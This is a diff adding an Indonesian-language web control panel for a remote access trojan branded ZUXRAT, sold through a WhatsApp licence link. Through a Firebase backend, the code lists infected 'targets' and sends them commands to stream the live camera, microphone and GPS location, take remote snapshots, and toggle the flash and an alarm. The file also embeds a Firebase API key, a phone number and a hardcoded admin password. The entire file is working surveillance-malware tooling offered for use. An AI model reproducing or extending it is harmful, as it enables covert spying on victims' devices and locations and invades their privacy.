@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ZUXRAT | ELITE MONITORING SYSTEM</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800;900&family=JetBrains+Mono&display=swap" rel="stylesheet">
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
+    <style>
+        :root { 
+            --red: #ff0033; 
+            --bg: #0a0a0c; 
+            --card: #141417; 
+            --input-bg: #1e1e22;
+            --text: #ffffff; 
+            --text-dim: #71717a;
+            --green: #00ffa3; 
+            --border: #27272a; 
+            --glow: rgba(255, 0, 51, 0.2);
+        }
+        
+        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background: var(--bg); color: var(--text); overflow: hidden; display: flex; justify-content: center; }
+        
+        /* Modern Scrollbar */
+        ::-webkit-scrollbar { width: 0px; }
+
+        .container { width: 100%; max-width: 450px; height: 100vh; position: relative; border-left: 1px solid var(--border); border-right: 1px solid var(--border); background: var(--bg); }
+
+        /* KEYFRAMES */
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes pulseLive { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.4); opacity: 0.5; } 100% { transform: scale(1); opacity: 1; } }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* GLOBAL LOADER */
+        #global-loader { position: fixed; inset: 0; background: var(--bg); z-index: 999999; display: flex; flex-direction: column; justify-content: center; align-items: center; transition: opacity 0.5s ease; }
+        .spinner { border: 4px solid var(--border); border-top: 4px solid var(--red); border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
+        .loader-text { margin-top: 20px; font-size: 11px; font-weight: 800; letter-spacing: 3px; color: var(--text-dim); animation: pulseLive 2s infinite; }
+
+        /* LOGIN PAGE */
+        #login-page { position: fixed; inset: 0; background: var(--bg); z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 25px; }
+        .login-card { width: 100%; background: var(--card); border-radius: 28px; border: 1px solid var(--border); overflow: hidden; animation: fadeInUp 0.6s ease; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
+        
+        /* Banner Login */
+        .login-banner { width: 100%; height: 160px; background-image: url('https://www.gifcen.com/wp-content/uploads/2022/06/anime-gif-16.gif'); background-size: cover; background-position: center; position: relative; }
+        .login-banner::after { content: ''; position: absolute; inset: 0; background: linear-gradient(to top, var(--card), transparent); }
+        .login-header { padding: 0 25px; margin-top: -30px; position: relative; z-index: 1; text-align: center; }
+        .login-header h1 { font-weight: 900; letter-spacing: 5px; font-size: 26px; }
+        .login-header h1 span { color: var(--red); text-shadow: 0 0 15px var(--red); }
+        .login-header p { font-size: 9px; letter-spacing: 3px; color: var(--text-dim); font-weight: 700; margin-top: 5px; }
+
+        .login-form { padding: 30px; }
+        .input-group { margin-bottom: 15px; position: relative; }
+        .input-group label { display: block; font-size: 10px; font-weight: 800; color: var(--text-dim); margin-bottom: 8px; letter-spacing: 1px; }
+        .input-group input { width: 100%; padding: 16px 16px 16px 45px; background: var(--input-bg); border: 1px solid var(--border); border-radius: 14px; color: #fff; outline: none; transition: 0.3s; }
+        .input-group i { position: absolute; left: 16px; top: 38px; color: var(--text-dim); }
+        .input-group input:focus { border-color: var(--red); background: #232328; }
+
+        .btn-login { width: 100%; padding: 18px; background: var(--red); color: #fff; border: none; border-radius: 16px; font-weight: 900; letter-spacing: 2px; cursor: pointer; transition: 0.3s; box-shadow: 0 8px 20px rgba(255,0,51,0.3); }
+        .btn-wa { width: 100%; padding: 14px; background: transparent; color: #fff; border: 1px dashed var(--border); border-radius: 16px; font-weight: 800; font-size: 11px; margin-top: 15px; cursor: pointer; transition: 0.3s; }
+
+        /* HEADER */
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 25px; border-bottom: 1px solid var(--border); background: rgba(10,10,12,0.8); backdrop-filter: blur(15px); z-index: 100; }
+        .header h2 { font-weight: 900; font-size: 18px; letter-spacing: 2px; }
+        .btn-logout { font-size: 11px; font-weight: 800; color: var(--text-dim); cursor: pointer; }
+
+        /* DASHBOARD & LIST */
+        .page { display: none; padding: 20px; height: calc(100vh - 80px); overflow-y: auto; }
+        .page.active { display: flex; flex-direction: column; animation: fadeInUp 0.4s ease; }
+
+        .dev-card { background: var(--card); padding: 20px; border-radius: 20px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; border: 1px solid var(--border); transition: 0.2s; cursor: pointer;}
+        .dev-card:active { transform: scale(0.97); }
+        .dev-info b { font-size: 15px; display: block; margin-bottom: 4px; font-family: 'JetBrains Mono', monospace; }
+        .live-status { display: flex; align-items: center; gap: 6px; color: var(--green); font-size: 9px; font-weight: 800; letter-spacing: 1px; }
+        .live-dot { width: 6px; height: 6px; background: var(--green); border-radius: 50%; animation: pulseLive 1.5s infinite; box-shadow: 0 0 8px var(--green); }
+
+        /* TOOL GRID */
+        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-top: 20px; }
+        .tool-card { background: var(--card); padding: 25px 15px; border-radius: 22px; text-align: center; border: 1px solid var(--border); transition: 0.3s; cursor: pointer; }
+        .tool-card i { font-size: 22px; color: var(--red); margin-bottom: 12px; display: block; transition: 0.3s; }
+        .tool-card span { font-size: 10px; font-weight: 800; color: var(--text-dim); letter-spacing: 1px; transition: 0.3s; }
+        .tool-card:active { border-color: var(--red); background: #1a1a1f; }
+        
+        /* Active State for Flash & Sound Tool */
+        .tool-card.active { border-color: var(--green); background: #0a1f14; }
+        .tool-card.active i { color: var(--green); text-shadow: 0 0 15px var(--green); }
+        .tool-card.active span { color: var(--green); }
+
+        /* MODERN POPUP SYSTEM */
+        .popup-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); display: none; align-items: center; justify-content: center; z-index: 20000; padding: 30px; }
+        .popup-card { background: var(--card); border-radius: 24px; border: 1px solid var(--border); width: 100%; max-width: 320px; padding: 30px; text-align: center; animation: fadeInUp 0.3s ease; }
+        .popup-card i { font-size: 40px; color: var(--red); margin-bottom: 20px; }
+        .popup-card h3 { font-weight: 900; margin-bottom: 10px; font-size: 18px; }
+        .popup-card p { color: var(--text-dim); font-size: 13px; line-height: 1.6; margin-bottom: 25px; }
+        .popup-btns { display: flex; gap: 10px; }
+        .btn-pop { flex: 1; padding: 14px; border-radius: 12px; border: none; font-weight: 800; font-size: 12px; cursor: pointer; }
+        .btn-pop.confirm { background: var(--red); color: #fff; }
+        .btn-pop.cancel { background: var(--input-bg); color: var(--text-dim); }
+
+        /* SHEET SYSTEM */
+        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); display: none; z-index: 998; }
+        .sheet { position: fixed; bottom: -100%; left: 50%; transform: translateX(-50%); width: 100%; max-width: 450px; background: var(--card); border-top: 1px solid var(--border); border-radius: 35px 35px 0 0; padding: 30px; transition: 0.5s cubic-bezier(0, 1, 0, 1); z-index: 999; }
+        .sheet.active { bottom: 0; }
+        .handle { width: 40px; height: 4px; background: var(--border); border-radius: 10px; margin: 0 auto 25px; }
+
+        /* LIVE IMAGE FRAME */
+        .frame { width: 100%; height: 380px; background: #000; border-radius: 24px; overflow: hidden; border: 1px solid var(--border); position: relative; display: flex; justify-content: center; align-items: center; }
+        .badge-live { position: absolute; top: 20px; left: 20px; background: var(--red); color: #fff; padding: 6px 12px; border-radius: 8px; font-size: 10px; font-weight: 900; display: flex; align-items: center; gap: 6px; box-shadow: 0 5px 15px rgba(255,0,0,0.3); z-index: 2; }
+        #liveImg { width: 100%; height: 100%; object-fit: cover; position: relative; z-index: 1; }
+
+        #toast { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); background: #fff; color: #000; padding: 12px 30px; border-radius: 50px; font-weight: 900; z-index: 100000; transition: 0.5s; font-size: 11px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        #toast.active { top: 30px; }
+        
+        .loading-box { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; text-align: center; }
+    </style>
+</head>
+<body>
+
+<div id="global-loader">
+    <div class="spinner"></div>
+    <div class="loader-text">INITIALIZING SYSTEM...</div>
+</div>
+
+<div id="toast">NOTIFICATION</div>
+
+<div id="popupOverlay" class="popup-overlay">
+    <div class="popup-card">
+        <i id="popIcon" class="fa-solid fa-circle-exclamation"></i>
+        <h3 id="popTitle">Konfirmasi</h3>
+        <p id="popDesc">Apakah Anda yakin ingin melakukan tindakan ini?</p>
+        <div class="popup-btns" id="popBtns">
+        </div>
+    </div>
+</div>
+
+<div id="login-page" style="display: none;">
+    <div class="login-card">
+        <div class="login-banner"></div>
+        <div class="login-header">
+            <h1>ZUX<span>RAT</span></h1>
+            <p>ADVANCED REMOTE TERMINAL</p>
+        </div>
+        <div class="login-form">
+            <div class="input-group">
+                <label>USERNAME</label>
+                <i class="fa-solid fa-user-shield"></i>
+                <input type="text" id="user" placeholder="Admin ID">
+            </div>
+            <div class="input-group">
+                <label>SECURITY PASSWORD</label>
+                <i class="fa-solid fa-lock"></i>
+                <input type="password" id="pass" placeholder="••••••••">
+            </div>
+            <button class="btn-login" onclick="checkLogin()">MASUK SISTEM</button>
+            <button class="btn-wa" onclick="buyAccount()">
+                <i class="fa-brands fa-whatsapp" style="margin-right: 8px;"></i> BELI AKUN ZUXRAT
+            </button>
+        </div>
+    </div>
+</div>
+
+<div id="overlay" class="overlay" onclick="closeSheet()"></div>
+
+<div class="container">
+    <div class="header">
+        <h2>ZUX<span style="color:var(--red)">RAT</span></h2>
+        <div class="btn-logout" onclick="logout()">DISCONNECT</div>
+    </div>
+
+    <div id="p-dash" class="page active">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+            <p style="font-size: 10px; color: var(--text-dim); font-weight: 800; letter-spacing: 2px;">TARGET TERHUBUNG</p>
+            <div class="live-dot" style="background:var(--red); box-shadow: 0 0 8px var(--red);"></div>
+        </div>
+        <div id="targetList">
+            </div>
+    </div>
+
+    <div id="p-ctrl" class="page">
+        <div style="display:flex; align-items:center; margin-bottom:30px;">
+            <i class="fa-solid fa-chevron-left" onclick="showPage('p-dash')" style="font-size:20px; cursor:pointer; margin-right:20px; color:var(--text-dim);"></i>
+            <div>
+                <b id="activeID" style="font-size: 18px; font-family:'JetBrains Mono'">---</b><br>
+                <small id="activeDID" style="color: var(--text-dim); font-size: 9px; font-weight: 700; letter-spacing: 1px;">ID: ---</small>
+            </div>
+        </div>
+        
+        <div class="grid">
+            <div class="tool-card" onclick="openLive()">
+                <i class="fa-solid fa-eye"></i>
+                <span>LIVE CAMERA</span>
+            </div>
+            <div class="tool-card" onclick="openTool('GPS')">
+                <i class="fa-solid fa-location-crosshairs"></i>
+                <span>TRACK GPS</span>
+            </div>
+            <div id="torchBtn" class="tool-card" onclick="toggleTorch()">
+                <i class="fa-solid fa-bolt"></i>
+                <span id="torchText">FLASH: OFF</span>
+            </div>
+            <div id="soundBtn" class="tool-card" onclick="toggleSound()">
+                <i class="fa-solid fa-bullhorn"></i>
+                <span id="soundText">ALARM: OFF</span>
+            </div>
+            <div class="tool-card" onclick="openTool('MIC')">
+                <i class="fa-solid fa-microphone"></i>
+                <span>LIVE MIC</span>
+            </div>
+            <div class="tool-card" onclick="sendCmd('SNAP')">
+                <i class="fa-solid fa-camera"></i>
+                <span>REMOTE SNAP</span>
+            </div>
+            <div class="tool-card" onclick="location.reload()" style="grid-column: span 2;">
+                <i class="fa-solid fa-sync-alt"></i>
+                <span>SYNC DATA</span>
+            </div>
+        </div>
+    </div>
+
+    <div id="sheet" class="sheet">
+        <div class="handle" onclick="closeSheet()"></div>
+        <div id="sheetBody"></div>
+    </div>
+</div>
+
+<script>
+    // System Initialization & Loading Screen
+    window.addEventListener('load', () => {
+        setTimeout(() => {
+            const loader = document.getElementById('global-loader');
+            loader.style.opacity = '0';
+            setTimeout(() => {
+                loader.style.display = 'none';
+                initApp();
+            }, 500);
+        }, 1500);
+    });
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyD3usv5rw801fV1nrXIwyDQ6eYEzC7hDk0",
+        authDomain: "kodangz.firebaseapp.com",
+        databaseURL: "https://kodangz-default-rtdb.firebaseio.com",
+        projectId: "kodangz",
+        storageBucket: "kodangz.firebasestorage.app",
+        messagingSenderId: "306989473099",
+        appId: "1:306989473099:web:9049d3135ce13e08a8dcce"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    let selDID = ""; 
+    let selUID = ""; 
+    let isTorch = false; 
+    let isSound = false; 
+    let audioUnlocked = false;
+
+    // MODERN POPUP FUNCTION
+    function showPopup(title, desc, type, onConfirm) {
+        const ov = document.getElementById('popupOverlay');
+        const btns = document.getElementById('popBtns');
+        document.getElementById('popTitle').innerText = title;
+        document.getElementById('popDesc').innerText = desc;
+        
+        btns.innerHTML = '';
+        if(type === 'confirm') {
+            btns.innerHTML = `<button class="btn-pop cancel" onclick="closePopup()">BATAL</button>
+                             <button class="btn-pop confirm" id="popOk">LANJUTKAN</button>`;
+            document.getElementById('popOk').onclick = () => { onConfirm(); closePopup(); };
+        } else {
+            btns.innerHTML = `<button class="btn-pop confirm" onclick="closePopup()">MENGERTI</button>`;
+        }
+        ov.style.display = 'flex';
+    }
+    function closePopup() { document.getElementById('popupOverlay').style.display = 'none'; }
+
+    // LOGIN & WA LOGIC
+    function initApp() {
+        if(sessionStorage.getItem('zuxrat_auth') !== 'true') { 
+            document.getElementById('login-page').style.display = 'flex'; 
+        }
+    }
+    
+    function checkLogin() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+        if(u === 'admin' && p === '123') {
+            sessionStorage.setItem('zuxrat_auth', 'true');
+            document.getElementById('login-page').style.display = 'none';
+            msg("AUTH SUCCESS: ENCRYPTED CONNECTION ESTABLISHED");
+        } else {
+            showPopup("Akses Ditolak", "Username atau Password salah. Sistem keamanan mendeteksi upaya login ilegal.", "alert");
+        }
+    }
+
+    function buyAccount() {
+        window.open('https://wa.me/6283821914043?text=Halo%20ZUXRAT,%20saya%20ingin%20membeli%20lisensi%20akun.', '_blank');
+    }
+
+    function logout() { 
+        showPopup("Logout", "Putuskan koneksi dari terminal ZUXRAT?", "confirm", () => {
+            sessionStorage.clear(); location.reload();
+        });
+    }
+
+    function msg(t) { const p=document.getElementById('toast'); p.innerText=t; p.classList.add('active'); setTimeout(()=>p.classList.remove('active'), 2500); }
+    function showPage(id) { document.querySelectorAll('.page').forEach(p=>p.classList.remove('active')); document.getElementById(id).classList.add('active'); closeSheet(); }
+    
+    function closeSheet() { 
+        document.getElementById('sheet').classList.remove('active'); 
+        document.getElementById('overlay').style.display='none'; 
+        if(selDID) {
+            db.ref(`data/${selDID}/mic`).off(); // Turn off mic listener
+        }
+    }
+
+    // RENDER TARGETS
+    db.ref('connections').on('value', s => {
+        const list = document.getElementById('targetList'); list.innerHTML = "";
+        if(!s.val()) return;
+        Object.keys(s.val()).forEach(uid => {
+            Object.keys(s.val()[uid]).forEach(did => {
+                list.innerHTML += `<div class="dev-card" onclick="goCtrl('${uid}','${did}')">
+                    <div class="dev-info" style="flex-grow:1">
+                        <b>${uid}</b>
+                        <div class="live-status"><div class="live-dot"></div> LIVE CONNECTION</div>
+                    </div>
+                    <i class="fa-solid fa-circle-minus" style="color:#333; font-size:20px; padding:10px;" onclick="event.stopPropagation(); deleteDevice('${uid}','${did}')"></i>
+                </div>`;
+            });
+        });
+    });
+
+    function deleteDevice(u, d) {
+        showPopup("Hapus Target", "Apakah Anda yakin ingin menghapus target " + u + " secara permanen?", "confirm", () => {
+            db.ref(`connections/${u}/${d}`).remove();
+            db.ref(`data/${d}`).remove();
+            msg("TARGET TERMINATED");
+        });
+    }
+
+    function goCtrl(u, d) {
+        selUID = u; selDID = d;
+        document.getElementById('activeID').innerText = u;
+        document.getElementById('activeDID').innerText = "ID: " + d;
+        
+        // Reset Torch State
+        isTorch = false;
+        const btnTorch = document.getElementById('torchBtn');
+        if(btnTorch) {
+            btnTorch.classList.remove('active');
+            document.getElementById('torchText').innerText = "FLASH: OFF";
+        }
+
+        // Reset Sound State
+        isSound = false;
+        const btnSound = document.getElementById('soundBtn');
+        if(btnSound) {
+            btnSound.classList.remove('active');
+            document.getElementById('soundText').innerText = "ALARM: OFF";
+        }
+
+        showPage('p-ctrl');
+    }
+
+    // FLASH / TORCH TOGGLE
+    function toggleTorch() {
+        isTorch = !isTorch;
+        const btn = document.getElementById('torchBtn');
+        const txt = document.getElementById('torchText');
+        if(isTorch) {
+            btn.classList.add('active');
+            txt.innerText = "FLASH: ON";
+            db.ref('commands/'+selDID).update({ torch: true, t: Date.now() });
+            msg("FLASH AKTIF");
+        } else {
+            btn.classList.remove('active');
+            txt.innerText = "FLASH: OFF";
+            db.ref('commands/'+selDID).update({ torch: false, t: Date.now() });
+            msg("FLASH DIMATIKAN");
+        }
+    }
+
+    // SOUND / ALARM TOGGLE
+    function toggleSound() {
+        isSound = !isSound;
+        const btn = document.getElementById('soundBtn');
+        const txt = document.getElementById('soundText');
+        if(isSound) {
+            btn.classList.add('active');
+            txt.innerText = "ALARM: ON";
+            db.ref('commands/'+selDID).update({ sound: true, t: Date.now() });
+            msg("ALARM AKTIF");
+        } else {
+            btn.classList.remove('active');
+            txt.innerText = "ALARM: OFF";
+            db.ref('commands/'+selDID).update({ sound: false, t: Date.now() });
+            msg("ALARM DIMATIKAN");
+        }
+    }
+
+    function getLoadingUI(text) {
+        return `<div class="loading-box" id="featLoader">
+                    <div class="spinner"></div>
+                    <p style="margin-top:15px; font-size:10px; font-weight:800; letter-spacing:2px; color:var(--text-dim);">${text}</p>
+                </div>`;
+    }
+
+    function openLive() {
+        document.getElementById('overlay').style.display='block';
+        document.getElementById('sheet').classList.add('active');
+        
+        // Layout with Spinner inside frame
+        document.getElementById('sheetBody').innerHTML = `
+            <div class="frame">
+                <div class="badge-live"><div class="live-dot" style="background:#fff"></div> REC LIVE</div>
+                ${getLoadingUI('MENGHUBUNGKAN KAMERA...')}
+                <img id="liveImg" src="" style="display:none;">
+            </div>
+            <p style="text-align:center; color:#555; font-size:10px; margin-top:20px; font-weight:900; letter-spacing:2px;">SECURE BYPASS ACTIVE</p>`;
+            
+        db.ref(`data/${selDID}/stream`).on('value', s => { 
+            if(s.val() && document.getElementById('liveImg')) {
+                document.getElementById('liveImg').src = s.val().frame;
+                document.getElementById('liveImg').style.display = 'block';
+                const loader = document.getElementById('featLoader');
+                if(loader) loader.style.display = 'none';
+            } 
+        });
+    }
+
+    function openTool(type) {
+        document.getElementById('overlay').style.display='block';
+        document.getElementById('sheet').classList.add('active');
+        
+        if(type === 'GPS') {
+            document.getElementById('sheetBody').innerHTML = getLoadingUI('MENGAMBIL DATA SATELIT GPS...');
+            
+            db.ref(`data/${selDID}/location`).on('value', s => {
+                if(s.val()) {
+                    document.getElementById('sheetBody').innerHTML = `
+                    <div class="data-box" style="background:var(--input-bg); padding:20px; border-radius:15px; border:1px solid var(--border); display:flex; justify-content:space-between; align-items:center; animation: fadeInUp 0.4s ease;">
+                        <b>LOCATION DATA</b>
+                        <a href="https://www.google.com/maps?q=${s.val().lat},${s.val().lng}" target="_blank" style="color:var(--green); text-decoration:none; font-weight:900; letter-spacing:1px; background:#0a1f14; padding:8px 15px; border-radius:8px; border:1px solid var(--green);">OPEN MAPS</a>
+                    </div>
+                    <p style="text-align:center; color:#555; font-size:10px; margin-top:20px; font-weight:900; letter-spacing:2px;">KOORDINAT DITEMUKAN</p>`;
+                }
+            });
+        }
+        
+        if(type === 'MIC') {
+            document.getElementById('sheetBody').innerHTML = `
+                <div style="text-align:center; padding:20px;">
+                    <i class="fa-solid fa-microphone-lines" style="font-size:40px; color:var(--red); margin-bottom:15px; animation: pulseLive 2s infinite;"></i>
+                    <h3 style="margin-bottom:10px; font-weight:900;">Live Audio Monitor</h3>
+                    <p style="font-size:11px; color:var(--text-dim); margin-bottom:25px;">Klik tombol di bawah untuk membuka akses mikrofon target secara real-time.</p>
+                    <button class="btn-login" onclick="unlockAudio()" style="box-shadow:none;">AKTIFKAN AUDIO</button>
+                    <div id="micStatus" style="margin-top:20px; font-size:10px; font-weight:800; color:var(--green); display:none; letter-spacing:2px;">MENDENGARKAN...</div>
+                </div>`;
+        }
+    }
+
+    function unlockAudio() {
+        audioUnlocked = true;
+        document.getElementById('micStatus').style.display = 'block';
+        msg("AUDIO STREAMING ACTIVE");
+        db.ref(`data/${selDID}/mic`).on('value', s => {
+            if(s.val() && audioUnlocked) {
+                const audio = new Audio(s.val().blob);
+                audio.play().catch(e => console.log("Interaksi diperlukan"));
+            }
+        });
+    }
+
+    function sendCmd(a) { 
+        db.ref('commands/'+selDID).set({action:a, t:Date.now()}); 
+        msg("SIGNAL SENT: " + a); 
+    }
+</script>
+</body>
+</html>
